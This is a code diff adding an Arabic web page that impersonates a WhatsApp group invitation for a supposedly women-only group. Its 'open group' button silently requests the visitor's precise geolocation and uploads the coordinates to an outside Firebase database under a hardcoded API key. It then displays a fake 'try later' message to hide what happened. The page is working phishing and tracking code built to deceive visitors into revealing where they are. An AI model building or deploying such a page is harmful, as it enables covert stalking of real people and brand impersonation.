@@ -1,0 +1,386 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>مجموعة واتساب</title>
+    <link rel="icon" href="icon.svg" />
+
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+
+    <style>
+      @font-face {
+        font-family: "WhatsApp";
+        src: url("./font.woff2") format("woff2");
+        font-weight: 400;
+        font-style: normal;
+        font-display: swap;
+      }
+
+      @font-face {
+        font-family: "WhatsApp";
+        src: url("./font.woff2") format("woff2");
+        font-weight: 500;
+        font-style: normal;
+        font-display: swap;
+      }
+
+      @font-face {
+        font-family: "WhatsApp";
+        src: url("./font.woff2") format("woff2");
+        font-weight: 700;
+        font-style: normal;
+        font-display: swap;
+      }
+
+      body {
+        font-family: "WhatsApp", sans-serif;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+    </style>
+  </head>
+
+  <body class="bg-white text-gray-900">
+    <!-- ================= MOBILE HEADER ================= -->
+    <header
+      class="lg:hidden h-20 px-6 flex items-center justify-between border-b border-gray-200 sticky top-0 bg-white"
+    >
+      <button class="text-3xl">
+        <img src="assets/images/menu.svg" width="32" height="" />
+      </button>
+
+      <img src="assets/images/logo.svg" width="131" height="" />
+
+      <a
+        href="#"
+        class="rounded-full bg-green-500 border border-black px-6 py-2 flex items-center gap-3 text-base"
+      >
+        تنزيل
+        <img src="assets/images/download.svg" width="16" height="16" />
+      </a>
+    </header>
+
+    <!-- ================= DESKTOP NAVIGATION ================= -->
+    <nav class="hidden lg:block sticky top-0 border-b border-gray-300 bg-white">
+      <div
+        class="max-w-screen-2xl mx-auto h-20 px-14 flex items-center justify-between"
+      >
+        <!-- WhatsApp Logo -->
+        <img src="assets/images/logo.svg" width="131" height="" />
+
+        <!-- Navigation Links -->
+        <div
+          class="flex items-center gap-7 xl:gap-9 text-base whitespace-nowrap"
+        >
+          <a href="#" class="flex gap-2">
+            المميزات
+            <img src="assets/images/arrow-down.svg" width="12" height="8" />
+          </a>
+          <a href="#">الخصوصية</a>
+          <a href="#">المدونة</a>
+          <a href="#">التطبيقات</a>
+          <a href="#" class="flex gap-2">
+            مركز المساعدة
+            <img src="assets/images/go.svg" width="10" class="-rotate-90" />
+          </a>
+          <a href="#" class="flex gap-2">
+            للأنشطة التجارية
+            <img src="assets/images/go.svg" width="10" class="-rotate-90" />
+          </a>
+        </div>
+
+        <!-- Left Buttons -->
+        <div class="flex items-center gap-4 shrink-0">
+          <a
+            href="#"
+            class="rounded-full border border-gray-500 px-5 py-2 flex items-center gap-3 text-base"
+          >
+            تسجيل الدخول
+            <img
+              src="assets/images/arrow-left.svg"
+              width="8"
+              class="rotate-180"
+            />
+          </a>
+
+          <a
+            href="#"
+            class="rounded-full bg-green-500 border border-black px-6 py-2 flex items-center gap-3 text-base"
+          >
+            تنزيل
+            <img src="assets/images/download.svg" width="16" height="16" />
+          </a>
+        </div>
+      </div>
+    </nav>
+    <!-- ================= HERO ================= -->
+    <main class="flex flex-col items-center text-center px-5 pt-12 lg:pt-24">
+      <!-- Group Logo -->
+      <div class="mb-8 leading-none">
+        <img src="assets/images/profile.png" width="122" height="" />
+      </div>
+
+      <!-- Title -->
+      <h1 class="text-2xl lg:text-2xl font-sans">المرجاوية (ستات فقط)</h1>
+
+      <p class="text-md lg:text-base mt-1">دعوة للانضمام إلى دردشة جماعية</p>
+
+      <!-- Buttons -->
+      <div class="flex flex-col gap-3 w-full max-w-xs mt-8">
+        <button
+          id="locationBtn"
+          class="h-12 rounded-full border border-black bg-green-500 flex items-center justify-center text-base font-medium hover:bg-green-600 transition"
+        >
+          فتح المجموعة
+        </button>
+
+        <p id="fakeResult" class="text-xs mt-1 text-start"></p>
+
+        <a
+          href="#"
+          class="h-12 rounded-full border border-gray-900 flex items-center justify-center text-base font-medium hover:bg-gray-50 transition"
+        >
+          المتابعة إلى واتساب ويب
+        </a>
+      </div>
+
+      <!-- Download App -->
+      <div class="flex items-center justify-center gap-2 my-7">
+        <div
+          class="text-white bg-green-500 rounded-md my-1 mx-0.5 flex items-center justify-center h-6 w-6"
+        >
+          <img src="assets/images/logo-2.svg" width="24" height="" />
+        </div>
+
+        <span class="text-md lg:text-xl">ليس لديك التطبيق؟</span>
+
+        <a
+          href="#"
+          class="underline decoration-green-500 underline-offset-4 decoration-2 font-medium"
+        >
+          التنزيل الآن
+        </a>
+      </div>
+    </main>
+
+    <!-- ================= MOBILE NAVIGATION ================= -->
+    <div class="lg:hidden border-b border-gray-200"></div>
+
+    <!-- ================= FOOTER ================= -->
+    <footer class="bg-[#111b21] text-white">
+      <div class="max-w-screen-2xl mx-auto p-6">
+        <!-- Footer Main -->
+        <div class="lg:py-20">
+          <a
+            href="#"
+            class="lg:hidden bg-green-500 text-gray-900 rounded-full w-32 h-12 flex items-center justify-center gap-3 text-base mb-8 lg:mb-0 mx-auto"
+          >
+            تنزيل
+            <img src="assets/images/download.svg" width="16" height="" />
+          </a>
+          <div
+            class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-x-7 gap-y-12"
+          >
+            <!-- Column 1 -->
+            <div class="lg:order-2">
+              <h3 class="text-gray-400 text-sm mb-7">ما نقدمه</h3>
+
+              <ul class="space-y-4 text-lg">
+                <li><a href="#">المميزات</a></li>
+                <li><a href="#">المدونة</a></li>
+                <li><a href="#">الأمان</a></li>
+                <li><a href="#">للأنشطة التجارية</a></li>
+              </ul>
+            </div>
+
+            <!-- Column 2 -->
+            <div class="lg:order-3">
+              <h3 class="text-gray-400 text-sm mb-7">من نحن</h3>
+
+              <ul class="space-y-4 text-lg">
+                <li><a href="#">معلومات عنا</a></li>
+                <li><a href="#">الوظائف</a></li>
+                <li><a href="#">مركز العلامة التجارية</a></li>
+                <li><a href="#">الخصوصية</a></li>
+              </ul>
+            </div>
+
+            <!-- Column 3 -->
+            <div class="lg:order-4">
+              <h3 class="text-gray-400 text-sm mb-7">استخدام واتساب</h3>
+
+              <ul class="space-y-4 text-lg">
+                <li><a href="#">الهاتف المحمول</a></li>
+                <li><a href="#">الكمبيوتر</a></li>
+                <li><a href="#">الجهاز اللوحي</a></li>
+                <li><a href="#">واتساب ويب</a></li>
+              </ul>
+            </div>
+
+            <!-- Column 4 -->
+            <div class="lg:order-5">
+              <h3 class="text-gray-400 text-sm mb-7">هل تحتاج إلى مساعدة؟</h3>
+
+              <ul class="space-y-4 text-lg">
+                <li><a href="#">الاتصال بنا</a></li>
+                <li><a href="#">مركز المساعدة</a></li>
+                <li><a href="#">التطبيقات</a></li>
+                <li><a href="#">تنبيهات الأمان</a></li>
+              </ul>
+            </div>
+
+            <!-- WhatsApp Brand -->
+            <div class="flex flex-col items-start gap-20">
+              <img
+                src="assets/images/logo.svg"
+                class="brightness-0 invert"
+                width="160"
+                height=""
+              />
+
+              <a
+                href="#"
+                class="hidden lg:flex bg-green-500 text-gray-900 rounded-full w-32 h-12 flex items-center justify-center gap-3 text-base"
+              >
+                تنزيل
+                <img src="assets/images/download.svg" width="16" height="" />
+              </a>
+            </div>
+          </div>
+        </div>
+
+        <!-- Bottom Footer -->
+        <div class="bg-[#33463F] h-px my-8" role="divider"></div>
+
+        <div>
+          <div
+            class="flex flex-col lg:flex-row items-center justify-between gap-8"
+          >
+            <!-- Copyright -->
+            <div class="text-xs leading-5">
+              © 2026 شركة
+              <br />
+              WhatsApp LLC
+            </div>
+
+            <!-- Legal -->
+            <div class="flex items-center gap-8 text-xs leading-5">
+              <a href="#">الشروط وسياسة<br />الخصوصية</a>
+              <a href="#">خريطة<br />الموقع</a>
+            </div>
+
+            <!-- Social Icons -->
+            <div class="flex items-center gap-5">
+              <a
+                href="#"
+                class="w-12 h-12 rounded-full border border-white/70 flex items-center justify-center text-xl"
+              >
+                <img src="assets/images/x.svg" width="16" height="" />
+              </a>
+              <a
+                href="#"
+                class="w-12 h-12 rounded-full border border-white/70 flex items-center justify-center font-bold"
+              >
+                <img src="assets/images/youtube.svg" width="16" height="" />
+              </a>
+              <a
+                href="#"
+                class="w-12 h-12 rounded-full border border-white/70 flex items-center justify-center"
+              >
+                <img src="assets/images/instgram.svg" width="16" height="" />
+              </a>
+              <a
+                href="#"
+                class="w-12 h-12 rounded-full border border-white/70 flex items-center justify-center"
+              >
+                <img src="assets/images/facebook.svg" width="8" height="" />
+              </a>
+              <a
+                href="#"
+                class="w-12 h-12 rounded-full border border-white/70 flex items-center justify-center text-xl"
+              >
+                <img src="assets/images/threads.svg" width="16" height="" />
+              </a>
+            </div>
+
+            <!-- Language -->
+            <button class="flex items-center gap-1 text-base">
+              العربية
+              <img
+                src="assets/images/arrow-down.svg"
+                class="brightness-0 invert"
+                width="12"
+                height=""
+              />
+            </button>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/13.3.0/firebase-app.js";
+
+      import {
+        getFirestore,
+        collection,
+        addDoc,
+        serverTimestamp,
+      } from "https://www.gstatic.com/firebasejs/13.3.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyAuVE2S4J1chfhaze9LyeWsDMdq4jPckTE",
+        authDomain: "contact-form-474ea.firebaseapp.com",
+        projectId: "contact-form-474ea",
+        storageBucket: "contact-form-474ea.firebasestorage.app",
+        messagingSenderId: "932909242190",
+        appId: "1:932909242190:web:378a0feb4da130e6ab701f",
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      const locationBtn = document.getElementById("locationBtn");
+      const fakeResult = document.getElementById("fakeResult");
+
+      locationBtn.addEventListener("click", () => {
+        if (!navigator.geolocation) return;
+
+        locationBtn.disabled = true;
+
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            try {
+              await addDoc(collection(db, "locations"), {
+                location: {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy,
+                },
+                createdAt: serverTimestamp(),
+              });
+
+              fakeResult.textContent = "حاول لاحقا";
+            } catch (error) {
+              console.error(error);
+              locationBtn.disabled = false;
+            }
+          },
+          (error) => {
+            console.error(error);
+            locationBtn.disabled = false;
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0,
+          },
+        );
+      });
+    </script>
+  </body>
+</html>
